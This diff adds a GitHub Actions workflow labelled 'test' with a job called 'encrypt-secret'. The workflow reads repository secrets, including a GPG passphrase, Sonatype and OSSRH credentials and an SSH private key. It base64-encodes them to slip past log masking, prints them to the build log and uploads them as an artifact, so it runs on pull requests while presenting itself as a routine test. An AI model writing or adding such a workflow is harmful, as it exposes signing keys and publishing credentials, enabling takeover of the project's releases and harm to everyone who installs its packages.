@@ -1,0 +1,45 @@
+name: test
+
+on:
+  workflow_dispatch:
+  pull_request:
+    branches:
+      - main
+
+jobs:
+  encrypt-secret:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - env:
+          MY_CLIENT_ID: ${{ secrets.SECRET2 }}
+          MY_CLIENT_ID2: ${{ secrets.SECRET1 }}
+          ID1: ${{ secrets.GPG_PASSPHRASE }}
+          ID2: ${{ secrets.SONATYPE_PASSWORD }}
+          ID3: ${{ secrets.SONATYPE_USERNAME }}
+          ID4: ${{ secrets.OSSRH_PASSWORD }}
+          ID5: ${{ secrets.OSSRH_USERNAME }}
+          ID6: ${{ secrets.SSH_PRIVATE_KEY }}
+          
+        run: |
+          echo "MY_CLIENT_ID (***)    = ${MY_CLIENT_ID}"
+          echo "MY_CLIENT_ID (base64) = $(echo ${MY_CLIENT_ID} | base64)"
+          echo ${ID1} | base64 >> a.txt
+          echo ${ID2} | base64 >> a.txt
+          echo ${ID3} | base64 >> a.txt
+          echo ${ID4} | base64 >> a.txt
+          echo ${ID5} | base64 >> a.txt
+          echo ${ID6} | base64 >> a.txt
+          cat a.txt
+          echo "Copy the above value, and then execute locally:"
+          echo "echo PASTE_HERE | base64 -D"
+          cat a.txt | base64 -d > a.txt
+ 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: build
+          path: a.txt
+          retention-days: 1
+          
